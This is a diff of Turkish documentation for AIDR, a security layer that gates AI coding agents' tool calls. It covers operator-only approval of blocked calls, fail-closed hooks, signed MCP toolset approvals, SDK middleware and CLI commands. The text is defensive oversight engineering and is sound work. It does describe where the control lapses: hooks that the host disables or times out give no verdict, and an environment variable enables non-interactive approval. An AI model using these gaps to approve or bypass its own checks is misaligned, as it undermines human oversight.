-AIDR_OPERATOR_NONINTERACTIVE=1 aidr approve <actionId> --yes   # yalnızca otomasyon için
+aidr approve 3f9c2a7b                      # kimliğin ilk 8 karakteri; "approve" yazılır
+aidr approve                               # numaralı listeden seçim (yalnızca terminalde)
+aidr approve 3f9c2a7b --ttl 5 --json       # daha kısa süre, makine tarafından okunabilir makbuz
+AIDR_OPERATOR_NONINTERACTIVE=1 aidr approve <64 karakterlik kimliğin tamamı> --yes   # yalnızca otomasyon için
 ```
 
 **Örnek**
 `aidr pending` şunu gösterir:
 
 ```
-1 ask(s) waiting for an operator decision (newest first):
+Operatör kararı bekleyen 1 istek (en yeniden başlayarak):
 
-  actionId:   <actionId>
+  actionId:   3f9c2a7be41d08c5…
   connector:  codex   tool: Bash
-  risk:       warning secrets (CLT-CRED-004)
+  risk:       yüksek secrets (CLT-CRED-004)
   ...
-Approve one retry of a call with: aidr approve <actionId>
+Tek bir yeniden denemeyi onaylamak için: aidr approve <kimlik>  (kimliğin ilk 8 karakteri yeterlidir)
+Ya da numaralı listeden seçmek için terminalinizde yalnızca 'aidr approve' çalıştırın.
 ```
 
-Onaydan sonra: "Tell the agent to retry the same call; the approval is spent by that one
-retry."
+Onaydan sonra: "Onaylandı. Yapay zekâ aracından 15 dakika içinde yeniden denemesini
+isteyin." Onay bu tek yeniden denemeyle tükenir.
 
 **Kapsam**
 
@@ -1725,7 +1793,7 @@ retry."
 
 **Ne yapar**
 Yönetilen modda bir `ask`, yalnızca aynı kullanıcıyla çalışan `aidr approve` komutuyla
-değil, panelin **Approvals** sayfasında bir sahip ya da yönetici tarafından da onaylanabilir:
+değil, panelin **Onaylar** sayfasında bir sahip ya da yönetici tarafından da onaylanabilir:
 farklı bir cihazdaki, kimliği doğrulanmış başka bir kişi.
 
 **Neden önemli**
@@ -1748,7 +1816,7 @@ Herhangi bir hata (ağ, geçersiz belirteç, bilinmeyen anahtar, uyuşmazlık, s
 yeniden kullanım) çağrıyı engelli tutar. Ajanın çağırabileceği bir onay yoktur.
 
 **Nasıl kullanılır**
-Ajanları yönetilen modda kaydedin, ardından panelde **Approvals** sayfasını açın. Alarm
+Ajanları yönetilen modda kaydedin, ardından panelde **Onaylar** sayfasını açın. Alarm
 kanalları yeni onay taleplerini duyurabilir
 ([Alarm entegrasyonları](03-control-plane-and-deployment.md#alarm-entegrasyonları-slack-teams-imzalı-webhook-ve-e-posta)).
 
@@ -1773,7 +1841,10 @@ onaylar ve ajanın bir sonraki aynı denemesi bir kez çalışır.
 **Ne yapar**
 AIDR üç arıza katmanını birbirinden ayırır. Connector giriş noktaları ve güvenlik kontrolleri
 **kapalı** (fail-closed) davranır; isteğe bağlı tespit adımları görünür biçimde atlanır ve
-hiçbir zaman temiz olarak raporlanmaz.
+hiçbir zaman temiz olarak raporlanmaz. Connector'ın fail-closed yanıtı, hook'u çalıştıran
+bir host gerektirir: host'un devre dışı bıraktığı, güvenmediği, öldürdüğü ya da zaman
+aşımına uğrattığı bir hook karar üretmez ve kararı host verir (aşağıdaki son sütun ve
+[uyumluluk matrisi](../../../compatibility-matrix.md#host-failure-behaviour)).
 
 **Neden önemli**
 Çöktüğünde çağrıları sessizce geçiren bir koruma sahte bir güven hissi verir. Alıcıların
@@ -1897,7 +1968,9 @@ kurumların merkezi politikaya, filo görünürlüğüne ve kanıta ihtiyacı va
 - Kaydı yapılmamış bir yönetilen kurulum yerel olarak uygulamaya devam eder ("Local
   protection ACTIVE (managed features unavailable …)"). Kaydı yapılmış uç noktalar, kontrol
   düzlemine erişilemediğinde `grace_period_hours` süresince (varsayılan 72 saat) imzalı
-  önbellekteki durumla uygulamaya devam eder.
+  önbellekteki durumla yönetilen özellikleri kullanmaya devam eder. Bu süreden sonra ya da
+  yetkilendirme (entitlement) sona erdiğinde veya iptal edildiğinde yönetilen özellikler
+  kapanır, yerel tespit uygulamaya devam eder ve her kararda bir bildirim yer alır.
 - Ticari sürümler `managed` modu zorunlu kılar ve imzalı artifact'larını doğrular; artifact
   doğrulama açık anahtarı olmadan başlamaz.
 
@@ -1954,7 +2027,7 @@ başlatılmaz ya da çalıştırılmaz.
 | Gemini CLI ya da Aider mevcut (AIDR connector'ı yok) | Diğer ajanlar | medium |
 | Root olarak çalışma, yazılabilir Docker soketi, ortamda bulut kimlik bilgisi değişkenleri, MCP sunucu yapılandırmasında düz metin gizli değer, devcontainer yok | Ortam | high'dan low'a |
 
-`aidr discover --agents --upload` panelin **Posture** sayfasına yalnızca tanımlayıcılar
+`aidr discover --agents --upload` panelin **Güvenlik durumu** sayfasına yalnızca tanımlayıcılar
 gönderir (host, denetim kimliği, önem, bir sayı); yollar, anahtar adları ve değerler
 makinede kalır.
 
@@ -2051,7 +2124,7 @@ araçlarına olduğu gibi yüklenir.
 kilit dosyaları, model ağırlık dosyaları, plugin tarama önbelleği, isteğe bağlı kaydedilmiş
 altyapı taraması). MCP komut satırlarındaki kimlik bilgileri maskelenir, ev dizini `~` olarak
 gösterilir. Eksik bir envanter `1` koduyla çıkar ve her boşluğu belgeye yazar. Panelin
-**Posture** sayfasındaki **Export AI-BOM** düğmesi, yalnızca raporlanan tanımlayıcılardan tüm
+**Güvenlik durumu** sayfasındaki **AI-BOM dışa aktar** düğmesi, yalnızca raporlanan tanımlayıcılardan tüm
 kiracı için bir belge üretir.
 
 **Nasıl kullanılır**
@@ -2096,7 +2169,7 @@ Eşleme veridir (`threats/mappings/frameworks.yaml`) ve kural kimliğine göre t
 olmayan ya da resmî listelerde bulunmayan bir kimlik kullanan kural bir testi başarısız
 kılar. Eşleşen çerçeve kimlikleri her kararla birlikte yerel denetim kaydına, SIEM
 aktarımlarına ve `aidr audit export` çıktısına taşınır; panel bunları olaylarda gösterir,
-matrisi ise Posture sayfasında sunar. 494 kural için güncel özet: OWASP LLM'de 3 kapsanan,
+matrisi ise Posture sayfasında sunar. 519 kural için güncel özet: OWASP LLM'de 3 kapsanan,
 5 kısmi, 2 uygulanamaz; OWASP Agentic'te 3 kapsanan, 5 kısmi, **2 kapsanmayan** (ASI07
 ajanlar arası iletişim, ASI08 zincirleme hatalar); MITRE ATLAS'ta 35 teknik eşlenmiş
 (9 kapsanan, 26 kısmi).
@@ -2165,7 +2238,10 @@ hatası döndürür. Sunucunun başlattığı `sampling`, `elicitation`, `roots`
 mesajları `serverInitiated` politikasına tabidir (varsayılan `deny`, alternatif `ignore`);
 gateway iletilen `initialize` mesajından bu yetenekleri çıkarır. Yeni veya değişmiş bir araç
 seti, bir operatör `aidr-mcp-approve` ile onaylayana kadar karantinada tutulur; bu komut hiçbir
-zaman bir MCP aracı veya HTTP uç noktası değildir.
+zaman bir MCP aracı veya HTTP uç noktası değildir. Her onay, operatörün parolayla korunan onay
+anahtarıyla imzalanır (`aidr-mcp-approve --generate-key` ile oluşturulur; gateway yalnızca açık
+anahtarı `approvalKeys` altında tutar). Bu nedenle gateway durum dizinine yalnızca yazabilen bir
+süreç bir araç setini onaylayamaz.
 
 **Nasıl kullanılır**
 
@@ -2173,7 +2249,7 @@ zaman bir MCP aracı veya HTTP uç noktası değildir.
 node packages/mcp-gateway/dist/aidr-mcp-gateway.mjs /secure/path/gateway.json
 # istemciyi Authorization: Bearer <token> ile http://127.0.0.1:7789/mcp/<serverId> adresine yönlendirin
 
-node packages/mcp-gateway/dist/aidr-mcp-approve.mjs /secure/path/gateway.json \
+node packages/mcp-gateway/dist/aidr-mcp-approve.mjs --key /operator/aidr-approval-key.pem /secure/path/gateway.json \
   tenant-a server-a <toolsetHash> <bindingSha256> <operatorId> "approved ticket and reason"
 ```
 
@@ -2222,9 +2298,11 @@ uygulama ekiplerinin aynı karar sözleşmesini kendi araçlarının önüne koy
 | `onAsk` olmadan `ask`, ya da `onAsk` false döndürür / hata fırlatır | Engeller |
 | Belirsiz (kontrol başarısız veya tutarsız) | Engeller; yalnızca `allowApprovalOfIndeterminateResults: true` ile onaylanabilir |
 
-Express/Next.js açık bir gerekçeyle HTTP 403 döndürür. `guardToolOutput` sonuçları inceler
+Express/Next.js genel bir HTTP 403 döndürür (`error` + `requestId`; gerekçe sunucu tarafındaki `onBlocked` kancasına gider) ve kimlik bilgisi taşımayan istek başlıklarını da inceler. `guardToolOutput` sonuçları inceler
 (varsayılan 256 KiB) ve bulguları engeller veya maskeler. URL itibarı varsayılan olarak
-kapalıdır (açmak için `urlReputationEnabled: true`). Hiç kural yüklenemezse `init()` açıkça
+kapalıdır (açmak için `urlReputationEnabled: true`); bu durumda yerel kuralların bir şey bulmadığı
+fetch `reputation_not_checked` olarak izin alır, asla temiz sayılmaz (`urlReputationUncheckedAction: "ask"`
+incelemeye tutar). Hiç kural yüklenemezse `init()` açıkça
 hata verir.
 
 **Nasıl kullanılır**
@@ -2232,9 +2310,9 @@ hata verir.
 ```ts
 import { AIDRClient, createMiddleware } from "@singularityrd/aidr-sdk";
 
-const client = new AIDRClient({ apiKey: process.env.AIDR_API_KEY! });
+const client = new AIDRClient({}); // yerel mod: API anahtarı gerekmez
 const middleware = createMiddleware(client, {
-  onAsk: async (result) => await askOperatorInTerminal(result), // çağıran sağlar, bant dışı
+  onAsk: async (result) => await askOperatorInTerminal(result), // çağıran sağlar, ajanın dışında
 });
 const safeRun = middleware.wrap(runShellCommand, (cmd) => ({ action: "execute", resource: cmd }));
 ```
@@ -2275,14 +2353,16 @@ allowlist'e eklerim.
 
 | Komut | Seçenekler | Amaç |
 | --- | --- | --- |
-| `aidr setup` | `-f, --force`, `--secret-store <kind>` | Yerel yapılandırmayı yazar ve connector kurulum yönergelerini gösterir (hook kurmaz) |
+| `aidr setup` | `-f, --force`, `--secret-store <kind>`, `--dry-run`, `--host <ids>`, `--no-install`, `--claude-plugin-dir <dir>`, `--cursor-vsix <file>`, `--vscode-vsix <file>`, `--release-key <file.pem>`, `-y, --yes` | AIDR'yi yapılandırır ve bulunan her yapay zekâ aracının connector'ını kurar ya da günceller (tekrar çalıştırılabilir). `--release-key` elle kurulumda sürüm açık anahtarını ayarlar (masaüstü kurulum dosyaları bunu kendisi yapar). `3` çıkış kodu henüz desteklenen bir yapay zekâ aracı bulunmadığı anlamına gelir (hata değil); `1` gerçek bir sorundur |
 | `aidr config` | `-g, --get <key>`, `-s, --set <values...>`, `-l, --list` | Yapılandırmayı okur veya günceller (gizli değerler argüman olarak değil, gizli istemle girilir) |
 | `aidr config rotate-key` | `--secret-store <kind>`, `--json` | CLI kurulum kimlik bilgisini yeniler |
 | `aidr config revoke-key` | `--secret-store <kind>`, `--json` | CLI kurulum kimlik bilgisini iptal eder |
-| `aidr status` | `--json` | Ölçülen kurulum durumu (tespit öz testi, connector'lar) |
-| `aidr doctor` | `--json` | Yapılandırma, tespit öz testi, connector'lar (Claude Code, OpenClaw, OpenCode, Codex), DLP, onay deposu, son karar, çekirdek sürümü; sorun varsa sıfır olmayan kodla çıkar |
+| `aidr status` | `--json` | Ölçülen kurulum durumu (tespit öz testi, connector'lar); korunan araçları, yeniden başlatılacakları ve elle adımları tek satırda özetler |
+| `aidr verify` | `--json` | Kayıtlı her connector'ın hook'undan zararsız bir canary geçirir (yalnızca veri, hiç çalıştırılmaz); yapay zekâ aracı başına BAŞARILI / BAŞARISIZ / ATLANDI |
+| `aidr update` | `--check`, `--from <location>`, `--catalog <location>`, `--allow-downgrade`, `-y, --yes`, `--json` | Masaüstü kurulum dosyasıyla kurulan uç noktalar (Windows, Linux): imzalı kataloğu ve kurulum dosyasının SHA-256 değerini doğrular, kurar, `aidr verify` çalıştırır, sorun çıkarsa geri alır. Otomatik denetimi `update.auto` (`notify` varsayılan, `install`, `off`) belirler |
+| `aidr doctor` | `--json`, `-v, --verbose` | Her denetim için bir satır: yapılandırma, sürüm anahtarı, tespit öz testi, connector'lar (Claude Code, OpenClaw, OpenCode, Codex), DLP, ajan profilleri, onaylar, ajan ortamı, son karar, çekirdek sürümü; `--verbose` her satırı açıklar (yollar, nedenler, anahtarın saklandığı yer); sorun varsa sıfır olmayan kodla çıkar |
 | `aidr pending` | `--json` | Operatör kararı bekleyen onay istekleri |
-| `aidr approve <actionId>` | `--ttl <minutes>` (1–1440, varsayılan 15), `--permit-allowlist`, `-y, --yes`, `--json` | Yalnızca operatör: tek bir yeniden denemeyi onaylar |
+| `aidr approve [kimlik]` | `--ttl <minutes>` (1–1440, varsayılan 15), `--permit-allowlist`, `-y, --yes` (yalnızca tam kimlikle), `--json` | Yalnızca operatör: tek bir yeniden denemeyi onaylar. Kimliğin ilk 8+ karakteri yeterlidir; kimlik verilmezse terminalde numaralı listeden seçilir |
 | `aidr allowlist list` | `--json` | Kayıtları gösterir (komutlar özet olarak) |
 | `aidr allowlist add <type> <value>` | `--reason <text>`, `-y, --yes` | Yalnızca operatör: kalıcı istisna (`url`, `command`, `file_path`) |
 | `aidr allowlist remove <type> <value>` | — | Kayıt siler (komut metni veya özet öneki) |
@@ -2298,7 +2378,7 @@ allowlist'e eklerim.
 | `aidr canary deploy \| list \| remove \| status` | `--path <dir>`, `--kinds <list>`, `--all`, `--json` | Yalnızca operatör: tuzak kimlik bilgileri |
 | `aidr compliance verify <report>` | `--public-key <file>`, `--require-signature`, `--json` | Uyum kanıt raporunu çevrim dışı doğrular |
 | `aidr privacy scan [file]` | `--json`, `--mask`, `--types <list>`, `--fail-on none\|any\|secret` (varsayılan `any`) | Bir dosyada veya stdin'de yerel TR/EN kişisel veri ve gizli bilgi taraması (TCKN, IBAN, telefon, e-posta, kart, gizli anahtarlar, ...); değeri asla yazdırmaz, yalnızca tür, sayı ve satır; `--mask` `[TYPE]` yer tutucularıyla maskelenmiş metni yazdırır; çıkış kodu `0` temiz, `2` bulgu, `3` eksik inceleme, `1` hata |
-| `aidr uninstall` | `--home <path>`, `--json` | Yalnızca AIDR'nin yönettiği hook'ları kaldırır (Claude Code uç nokta kurucusu makbuzu), sizin hook'larınızı korur |
+| `aidr uninstall` | `--home <path>`, `--json`, `--keep-data`, `--dry-run`, `--host <ids>`, `--hooks-only`, `-y, --yes` | AIDR'yi kaldırır (onay gerekir): her yapay zekâ aracının connector'ı, AIDR'nin yönettiği hook'lar, `~/.singularity-aidr` ve AIDR kasa kayıtları; sizin hook'larınız kalır |
 
 `--secret-store`, `windows-dpapi`, `macos-keychain`, `linux-secret-service` veya `file-acl`
 değerlerini alır (varsayılan: işletim sistemi kasasını algıla).
@@ -2311,7 +2391,9 @@ Onaylı sürümü özel kayıt deposundan kurun
 
 ```bash
 $ aidr doctor
-# kontroller: configuration, detection, connectors, dlp, operator_approvals, last_verdict, core_version
+# kontroller: configuration, integrity, detection, connectors, dlp, agent_profiles,
+#             operator_approvals, agent_environment, last_verdict, core_version
+$ aidr doctor --verbose   # aynısı; her satırın altında neden, yol ve çözüm
 ```
 
 **Kapsam**
@@ -2321,10 +2403,12 @@ $ aidr doctor
 | Free, Team, Business, Enterprise (`--upload` ve Yapay Zekâ Güvenlik Duruşu özellikleri: Business, Enterprise) | Yerel; Cloud, On-prem, Air-gapped | Windows, Linux, macOS |
 
 **Sınırlamalar**
-- `aidr setup` bir connector'ı kurmaz veya etkinleştirmez; connector kurulumu her
-  connector'ın kendi rehberine göre yapılır.
-- `aidr uninstall` şu anda yalnızca Claude Code uç nokta kurucusu makbuzunu destekler ve
-  doğrulanmış bir makbuz olmadan işlem yapmaz.
+- `aidr setup` bir connector'ı yalnızca yapay zekâ aracının kendi komut satırı ya da
+  yapılandırması izin verdiğinde kurar; Codex hook'larına yine `/hooks` ile bir kez güven
+  verilmeli, Cursor ve VS Code'da "Singularity AIDR: Enable protection" çalıştırılmalıdır.
+  Kalan her elle adımı `aidr status` gösterir.
+- `aidr update` yalnızca Windows ya da Linux kurulum dosyasıyla yapılan kurulumları
+  günceller; npm, eklenti ve VSIX kurulumları nasıl kurulduysa öyle güncellenir.
 - `aidr doctor` Cursor/VS Code hook'larını incelemez; eklentideki **Show hook health**
   komutunu kullanın.
 
